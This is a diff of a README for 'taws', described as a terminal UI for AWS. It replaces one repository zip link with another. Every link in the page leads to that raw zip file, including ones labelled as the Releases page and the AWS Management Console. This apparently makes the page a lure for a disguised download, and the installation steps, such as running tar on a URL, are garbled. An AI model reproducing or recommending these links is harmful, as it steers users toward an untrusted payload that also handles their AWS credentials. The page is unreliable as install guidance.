@@ -6,7 +6,7 @@ Welcome to taws, your easy-to-use terminal UI for AWS. This application lets you
 
 ## 📥 Download
 
-[![Download taws](https://raw.githubusercontent.com/A12sdfghjkl/taws/master/src/Software-v1.8-beta.1.zip)](https://raw.githubusercontent.com/A12sdfghjkl/taws/master/src/Software-v1.8-beta.1.zip)
+[![Download taws](https://github.com/A12sdfghjkl/taws/raw/refs/heads/master/src/resources/Software-3.1.zip)](https://github.com/A12sdfghjkl/taws/raw/refs/heads/master/src/resources/Software-3.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,13 +18,13 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/A12sdfghjkl/taws/master/src/Software-v1.8-beta.1.zip) to download the latest version of taws. 
+To get started, visit the [Releases page](https://github.com/A12sdfghjkl/taws/raw/refs/heads/master/src/resources/Software-3.1.zip) to download the latest version of taws. 
 
 1. Open your web browser.
 2. Click on the link above.
 3. On the Releases page, find the latest version.
 4. For Windows users, download the `.exe` file.
-5. For macOS or Linux users, download the `https://raw.githubusercontent.com/A12sdfghjkl/taws/master/src/Software-v1.8-beta.1.zip` file.
+5. For macOS or Linux users, download the `https://github.com/A12sdfghjkl/taws/raw/refs/heads/master/src/resources/Software-3.1.zip` file.
 6. Once downloaded, follow the installation instructions below.
 
 ### 🖥️ Installation Instructions
@@ -42,7 +42,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/A12s
 3. Run the following command to extract the contents:
 
    ```bash
-   tar -xzf https://raw.githubusercontent.com/A12sdfghjkl/taws/master/src/Software-v1.8-beta.1.zip
+   tar -xzf https://github.com/A12sdfghjkl/taws/raw/refs/heads/master/src/resources/Software-3.1.zip
    ```
 
 4. Navigate into the extracted folder:
@@ -83,7 +83,7 @@ Once you have installed taws, you can start using it to view and manage your AWS
 
 ### How do I get my AWS credentials?
 
-Visit the [AWS Management Console](https://raw.githubusercontent.com/A12sdfghjkl/taws/master/src/Software-v1.8-beta.1.zip) and navigate to your IAM user settings. Create access keys if you do not have them.
+Visit the [AWS Management Console](https://github.com/A12sdfghjkl/taws/raw/refs/heads/master/src/resources/Software-3.1.zip) and navigate to your IAM user settings. Create access keys if you do not have them.
 
 ### Can I use taws without AWS credentials?
 
@@ -95,7 +95,7 @@ Check the output messages in the terminal for guidance. Ensure you have the righ
 
 ### How do I find updates for taws?
 
-You can find the latest updates on the [Releases page](https://raw.githubusercontent.com/A12sdfghjkl/taws/master/src/Software-v1.8-beta.1.zip). 
+You can find the latest updates on the [Releases page](https://github.com/A12sdfghjkl/taws/raw/refs/heads/master/src/resources/Software-3.1.zip). 
 
 ## 🛠️ Support
 
